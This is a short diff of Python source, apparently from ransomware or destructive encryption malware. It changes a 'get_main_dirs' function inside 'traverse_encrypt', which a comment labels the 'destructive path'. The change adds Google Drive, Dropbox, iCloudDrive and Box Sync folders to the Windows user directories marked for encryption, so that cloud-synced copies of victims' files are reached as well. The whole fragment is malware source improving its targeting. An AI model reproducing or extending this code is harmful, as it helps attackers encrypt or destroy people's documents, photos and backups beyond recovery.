@@ -198,14 +198,21 @@ def traverse_encrypt(drive, key):
     def get_main_dirs(username, drive):
         # Construct dynamic destructive path
         main_dirs = [
+            # Main folders of user
             os.path.join(drive, f"Users\\{username}\\Downloads"),
             os.path.join(drive, f"Users\\{username}\\Documents"),
             os.path.join(drive, f"Users\\{username}\\Music"),
             os.path.join(drive, f"Users\\{username}\\Pictures"),
             os.path.join(drive, f"Users\\{username}\\Desktop"),
             os.path.join(drive, f"Users\\{username}\\Videos"),
-            os.path.join(drive, f"Users\\{username}\\OneDrive"),
             os.path.join(drive, f"Users\\{username}\\Favorites"),
+            # Cloud based paths
+            os.path.join(drive, f"Users\\{username}\\OneDrive"),
+            os.path.join(drive, f"Users\\{username}\\Google Drive"),
+            os.path.join(drive, f"Users\\{username}\\Dropbox"),
+            os.path.join(drive, f"Users\\{username}\\iCloudDrive"),
+            os.path.join(drive, f"Users\\{username}\\Box Sync"),
+            # System used paths
             os.path.join(drive, f"Users\\{username}\\AppData\\Roaming"),
             os.path.join(drive, f"Users\\{username}\\AppData\\Local\\Packages"),
             os.path.join(drive, f"Users\\{username}\\AppData\\Local\\Temp"),
